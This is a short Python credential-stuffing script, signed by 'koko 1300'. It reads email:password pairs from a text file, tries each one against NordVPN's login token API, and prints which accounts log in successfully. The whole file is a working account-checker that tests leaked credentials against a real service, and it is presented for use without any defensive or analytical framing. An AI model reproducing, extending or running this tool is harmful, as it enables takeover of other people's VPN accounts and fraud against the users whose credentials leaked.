print("#################")
print("made by koko 1300")
print("#################")

import requests

# Read accounts from txt file
with open('accounts.txt', 'r') as f:
    account_list = f.read().splitlines()

# Loop through the account list
for account in account_list:
    # Extract the mail and password from the account string
    mail, password = account.split(':')
    
    # Send a POST request to Nord VPN login API with the mail and password
    response = requests.post('https://api.nordvpn.com/v1/users/tokens', json={"email": mail, "password": password})
    
    # Check if the login was successful
    if response.status_code == 200:
        print(f'[Nord pass]: Login successful for account: {mail}:{password} ;)')
    else:
        print(f'Nord fail]: Failed to login for account: {mail}:{password} :(')
